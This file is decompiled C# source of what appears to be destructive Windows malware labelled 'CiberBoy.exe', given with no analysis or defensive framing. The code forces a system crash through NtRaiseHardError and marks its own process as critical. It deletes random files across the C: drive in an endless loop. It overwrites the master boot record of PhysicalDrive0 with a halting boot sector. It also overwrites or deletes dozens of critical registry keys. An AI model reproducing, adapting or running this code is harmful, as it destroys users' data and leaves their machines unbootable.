using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

#nullable disable
internal class Class1
{
  private static RNGCryptoServiceProvider rngcryptoServiceProvider_0 = new RNGCryptoServiceProvider();

  [DllImport("ntdll.dll")]
  public static extern int NtRaiseHardError(
    uint uint_0,
    uint uint_1,
    uint uint_2,
    uint uint_3,
    uint uint_4,
    out uint uint_5);

  [DllImport("ntdll.dll")]
  public static extern int RtlAdjustPrivilege(
    int int_0,
    bool bool_0,
    bool bool_1,
    out bool bool_2);

  public static void smethod_0()
  {
    if (Class1.RtlAdjustPrivilege(19, true, false, out bool _) != 0)
      return;
    Class1.NtRaiseHardError(3735936685U, 0U, 0U, 0U, 6U, out uint _);
  }

  [DllImport("ntdll.dll", SetLastError = true)]
  private static extern uint NtSetInformationProcess(
    IntPtr intptr_0,
    int int_0,
    ref int int_1,
    int int_2);

  public static void smethod_1()
  {
    if (!Class1.smethod_2())
    {
      int num1 = (int) MessageBox.Show("Admin perms needed", "CiberBoy.exe", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }
    else
    {
      IntPtr handle = Process.GetCurrentProcess().Handle;
      int int_1 = 1;
      uint num2 = Class1.NtSetInformationProcess(handle, 29, ref int_1, 4);
      if (num2 == 0U)
        return;
      int num3 = (int) MessageBox.Show("Disable Windows Defender" + num2.ToString(), "CiberBoy.exe", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }
  }

  private static bool smethod_2()
  {
    return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
  }

  public static void smethod_3()
  {
    while (true)
    {
      Random random = new Random();
      try
      {
        string[] files = Directory.GetFiles("C:\\", "*.*", SearchOption.AllDirectories);
        File.Delete(files[random.Next(files.Length)]);
      }
      catch (Exception ex)
      {
        Console.WriteLine("can't delete that file: " + (ex == null ? (string) null : ex.ToString()));
      }
      Thread.Sleep(random.Next(1, 50));
    }
  }

  [DllImport("kernel32")]
  private static extern IntPtr CreateFile(
    string string_0,
    uint uint_0,
    uint uint_1,
    IntPtr intptr_0,
    uint uint_2,
    uint uint_3,
    IntPtr intptr_1);

  [DllImport("kernel32")]
  private static extern bool WriteFile(
    IntPtr intptr_0,
    byte[] byte_0,
    uint uint_0,
    out uint uint_1,
    IntPtr intptr_1);

  public static void smethod_4()
  {
    byte[] byte_0 = new byte[512]
    {
      (byte) 235,
      (byte) 0,
      (byte) 232,
      (byte) 0,
      (byte) 0,
      (byte) 176,
      (byte) 254,
      (byte) 230,
      (byte) 100,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 85,
      (byte) 170
    };
    Class1.WriteFile(Class1.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero), byte_0, 512U, out uint _, IntPtr.Zero);
  }

  public static void smethod_5()
  {
    try
    {
      bool bool_0 = Class1.smethod_9((object) Environment.OSVersion.VersionString);
      string[] strArray = new string[48]
      {
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Kernel",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SubSystems",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Eventlog",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Winmgmt",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lsass",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\svchost",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\cdrom",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\disk",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netbt",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\netbios",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ndis",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\mrxsmb",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\mrxsmb10",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\fvevol",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\storahci",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\usbstore",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Kernel",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SubSystems",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\BFE",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Spooler",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Dhcp",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NlaSvc",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DnsCache",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip6",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\RasMan",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USB",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\PCI",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\kbdclass",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\mouclass",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\monitor",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer"
      };
      foreach (string str in strArray)
      {
        string string_0 = str;
        Thread thread = new Thread((ThreadStart) (() =>
        {
          try
          {
            if (!bool_0)
            {
              using (RegistryKey registryKey_0 = Class1.smethod_8(string_0))
              {
                if (registryKey_0 == null)
                  return;
                Console.WriteLine("fanculo regedit: " + string_0 + "...");
                Class1.smethod_7(registryKey_0, (RandomNumberGenerator) Class1.rngcryptoServiceProvider_0);
              }
            }
            else
              Class1.smethod_6(string_0);
          }
          catch
          {
          }
        }));
        thread.Start();
        thread.Join();
      }
      Console.WriteLine("Done");
    }
    catch
    {
    }
  }

  private static void smethod_6(string string_0)
  {
    try
    {
      Process.Start(new ProcessStartInfo("cmd.exe", "/c " + ("reg delete \"" + string_0 + "\" /f"))
      {
        CreateNoWindow = true,
        UseShellExecute = false
      }).WaitForExit();
      Console.WriteLine("Chiave cancellata: " + string_0);
    }
    catch (Exception ex)
    {
    }
  }

  private static void smethod_7(
    RegistryKey registryKey_0,
    RandomNumberGenerator randomNumberGenerator_0)
  {
    try
    {
      foreach (string subKeyName in registryKey_0.GetSubKeyNames())
      {
        if (!Class1.smethod_10(subKeyName))
        {
          using (RegistryKey registryKey_0_1 = registryKey_0.OpenSubKey(subKeyName, true))
          {
            if (registryKey_0_1 != null)
            {
              foreach (string valueName in registryKey_0_1.GetValueNames())
              {
                byte[] data = new byte[32];
                randomNumberGenerator_0.GetBytes(data);
                try
                {
                  registryKey_0_1.SetValue(valueName, (object) data, RegistryValueKind.Binary);
                }
                catch
                {
                }
              }
              Class1.smethod_7(registryKey_0_1, randomNumberGenerator_0);
            }
          }
        }
      }
    }
    catch
    {
    }
  }

  private static RegistryKey smethod_8(string string_0)
  {
    return string_0.StartsWith("HKEY_LOCAL_MACHINE") ? Registry.LocalMachine.OpenSubKey(string_0.Substring(19), true) : (!string_0.StartsWith("HKEY_CURRENT_USER") ? (!string_0.StartsWith("HKEY_USERS") ? (RegistryKey) null : Registry.Users.OpenSubKey(string_0.Substring(11), true)) : Registry.CurrentUser.OpenSubKey(string_0.Substring(18), true));
  }

  private static bool smethod_9(object object_0) => Environment.OSVersion.Version.Major >= 6;

  private static bool smethod_10(string string_0)
  {
    string[] strArray = new string[2]
    {
      "Microsoft\\.NETFramework",
      "Microsoft\\NET Framework Setup"
    };
    bool flag;
    foreach (string str in strArray)
    {
      if (string_0.StartsWith(str, StringComparison.OrdinalIgnoreCase))
      {
        flag = true;
        goto label_6;
      }
    }
    flag = false;
label_6:
    return flag;
  }
}
